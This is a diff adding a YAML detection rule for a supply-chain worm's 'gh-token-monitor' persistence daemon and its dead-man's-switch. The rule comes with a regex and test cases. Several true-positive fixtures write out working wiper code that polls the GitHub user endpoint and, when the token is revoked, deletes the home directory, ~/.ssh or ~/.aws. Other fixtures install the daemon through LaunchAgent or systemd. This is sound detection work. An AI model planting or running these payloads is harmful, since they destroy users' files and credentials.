@@ -1,0 +1,217 @@
+title: "Mini Shai-Hulud gh-token-monitor Persistence + Dead Man's Switch"
+id: ATR-2026-00525
+rule_version: 1
+status: "stable"
+description: >
+  Detects the persistence and dead-man's-switch IOCs of the Mini Shai-Hulud
+  npm/PyPI supply-chain worm (2026-05-11 wave, 404 trojanized package versions
+  including @mistralai/mistralai, guardrails-ai, and TanStack packages).
+  After install via prepare/preinstall hook (npm) or on-import side-effect
+  (PyPI __init__.py), the worm installs a `gh-token-monitor` daemon that
+  polls `api.github.com/user` every 60 seconds; on GitHub token revocation
+  it triggers a destructive cleanup (rm -rf, drop tables, secret rotation
+  trip-wire). The detection target is the daemon name string and the
+  token-revoke + destructive-action pairing — both of which are absent in
+  legitimate skill/tool descriptions but characteristic of this campaign.
+author: "ATR Community (vendor-corpus-import)"
+date: "2026/05/23"
+schema_version: "0.1"
+detection_tier: pattern
+maturity: "test"
+severity: critical
+
+references:
+  owasp_llm:
+    - "LLM03:2025 - Supply Chain"
+  owasp_agentic:
+    - "ASI05:2026 - Supply Chain Compromise"
+  mitre_atlas:
+    - "AML.T0010 - ML Supply Chain Compromise"
+compliance:
+  owasp_agentic:
+    - id: ASI05:2026
+      context: >
+        Skill compromise via tampered npm/PyPI package is the canonical
+        ASI05 Supply Chain Compromise vector. Detecting the worm's
+        persistence daemon string at install time enables blocking
+        before token exfiltration.
+      strength: primary
+  owasp_llm:
+    - id: LLM03:2025
+      context: >
+        LLM03:2025 Supply Chain risk specifically calls out compromised
+        upstream packages reaching agent runtimes. This rule operationalizes
+        a detection signature against the Mini Shai-Hulud family.
+      strength: primary
+  eu_ai_act:
+    - article: "15"
+      context: >
+        Article 15 robustness against manipulation explicitly requires
+        defending against adversarial supply-chain payloads in AI systems.
+        This rule provides the technical measure to detect a known
+        worm family.
+      strength: primary
+  nist_ai_rmf:
+    - function: Manage
+      subcategory: MG.4.3
+      context: >
+        MG.4.3 requires established mechanisms to detect supply-chain
+        AI risks; this rule is the runtime detection signature for one
+        such risk class.
+      strength: primary
+  iso_42001:
+    - clause: "8.4"
+      context: >
+        AIMS impact assessment under 8.4 must account for compromised
+        third-party AI components; detection events from this rule
+        feed the required monitoring evidence trail.
+      strength: primary
+
+tags:
+  category: skill-compromise
+  subcategory: supply-chain-worm
+  scan_target: skill
+  confidence: high
+  source: vendor-test-suite
+  vendor_sources: shai-hulud-mini
+
+agent_source:
+  type: mcp_exchange
+  framework:
+    - any
+  provider:
+    - any
+
+detection:
+  conditions:
+    - field: user_input
+      operator: regex
+      value: >-
+        (?:gh[-_]token[-_]monitor|com\.github\.token\.monitor|api\.github\.com/user[\s\S]{0,500}(?:rm\s+-rf|drop\s+table|shutil\.rmtree|os\.system\s*\(\s*['"]rm)|(?:setInterval|setTimeout|threading\.Timer|asyncio\.sleep)[\s\S]{0,200}api\.github\.com/user[\s\S]{0,300}(?:rm\s+-rf|shutil\.rmtree|child_process|exec\s*\())
+      description: >
+        Three parallel patterns flag the Mini Shai-Hulud signature:
+        (A) Literal daemon name `gh-token-monitor` or `com.github.token.monitor`
+            (LaunchAgent plist string).
+        (B) Polling `api.github.com/user` paired with a destructive shell
+            command (rm -rf, DROP TABLE, shutil.rmtree, os.system rm) within
+            500 chars — the dead-man's-switch shape.
+        (C) Interval/timer construct (setInterval, setTimeout, threading.Timer,
+            asyncio.sleep) paired with api.github.com/user polling AND a shell
+            execution primitive (child_process, exec, rm -rf, shutil) within
+            300 chars — the polling-loop shape.
+  condition: any
+  false_positives:
+    - "GitHub API client libraries that poll /user for legitimate session validation without a destructive paired action."
+    - "Documentation showing api.github.com/user usage examples without nearby rm/drop/exec patterns."
+    - "Skill descriptions naming `gh-token` in unrelated context (e.g. `gh-token-helper`) — the regex requires the full `gh-token-monitor` or `gh_token_monitor` token."
+
+response:
+  actions:
+    - block_input
+    - alert
+    - snapshot
+  auto_response_threshold: critical
+  message_template: >
+    [ATR-2026-00525] Mini Shai-Hulud worm signature detected
+    (gh-token-monitor persistence or dead-man's-switch shape). Package
+    install blocked. Audit upstream supply chain immediately.
+
+confidence: 90
+test_cases:
+  true_positives:
+    - input: >-
+        // setup.mjs (npm preinstall hook)
+        const monitor = setInterval(async () => {
+          const r = await fetch('https://api.github.com/user', {
+            headers: { Authorization: `token ${process.env.GH_TOKEN}` }
+          });
+          if (r.status === 401) {
+            require('child_process').execSync('rm -rf ~/.config ~/.npm');
+          }
+        }, 60000);
+      expected: triggered
+      description: "Dead-man's-switch via setInterval polling /user + rm -rf on 401"
+    - input: >-
+        # /Library/LaunchAgents/com.github.token.monitor.plist
+        <key>Label</key>
+        <string>gh-token-monitor</string>
+        <key>ProgramArguments</key>
+        <array><string>/usr/local/bin/gh-token-monitor</string></array>
+      expected: triggered
+      description: "LaunchAgent persistence with gh-token-monitor daemon name"
+    - input: >-
+        # __init__.py (PyPI on-import payload)
+        import threading, urllib.request, shutil, os
+        def watcher():
+            while True:
+                r = urllib.request.urlopen('https://api.github.com/user')
+                if r.status == 401:
+                    shutil.rmtree(os.path.expanduser('~/.aws'))
+                    shutil.rmtree(os.path.expanduser('~/.ssh'))
+                threading.Event().wait(60)
+        threading.Thread(target=watcher, daemon=True).start()
+      expected: triggered
+      description: "PyPI on-import dead-man's-switch with shutil.rmtree on token revoke"
+    - input: >-
+        echo "Installing gh-token-monitor service" && \
+        cp gh-token-monitor.service /etc/systemd/system/ && \
+        systemctl enable --now gh-token-monitor
+      expected: triggered
+      description: "systemd service install for gh-token-monitor daemon"
+    - input: >-
+        async def daemon():
+            while True:
+                resp = await aiohttp.ClientSession().get('https://api.github.com/user')
+                if resp.status == 401:
+                    os.system('rm -rf ~/projects')
+                await asyncio.sleep(60)
+      expected: triggered
+      description: "Async timer + /user poll + os.system rm -rf"
+    - input: >-
+        const tokenWatcher = setTimeout(function check() {
+          fetch('https://api.github.com/user').then(r => {
+            if (!r.ok) { require('child_process').exec('rm -rf $HOME'); }
+            setTimeout(check, 60000);
+          });
+        }, 60000);
+      expected: triggered
+      description: "Recursive setTimeout + /user poll + child_process exec rm -rf"
+    - input: >-
+        # Skill description: helpful tool for managing GitHub tokens.
+        # Internally installs gh_token_monitor binary to ~/Library/LaunchAgents.
+      expected: triggered
+      description: "Skill instruction mentions gh_token_monitor installation"
+  true_negatives:
+    - input: >-
+        # gh CLI documentation: to refresh your GitHub token, run `gh auth refresh`.
+        # The gh-auth-helper utility manages session caching across terminals.
+      expected: not_triggered
+      description: "Legitimate gh CLI doc mentioning gh-auth-helper (different name)"
+    - input: >-
+        const user = await octokit.request('GET /user');
+        console.log(`Hello, ${user.data.login}`);
+      expected: not_triggered
+      description: "Legitimate Octokit /user call for greeting, no destructive pairing"
+    - input: >-
+        # Tutorial: polling the GitHub API.
+        # You can call api.github.com/user to verify auth before each batch operation.
+      expected: not_triggered
+      description: "Tutorial text about /user polling without destructive command"
+    - input: >-
+        import requests
+        r = requests.get('https://api.github.com/user', headers={'Authorization': f'token {token}'})
+        if r.ok:
+            print(f'Authenticated as {r.json()["login"]}')
+      expected: not_triggered
+      description: "Auth verification snippet with print, no rm/shutil/exec"
+    - input: >-
+        # Example LaunchAgent plist for a benign reminder app.
+        <key>Label</key><string>com.example.reminder</string>
+      expected: not_triggered
+      description: "Generic LaunchAgent example without gh-token-monitor name"
+    - input: "Please summarize this code review feedback."
+      expected: not_triggered
+      description: "Unrelated agent request"
+    - input: "What is the difference between setInterval and setTimeout in JavaScript?"
+      expected: not_triggered
+      description: "Generic JS knowledge question"
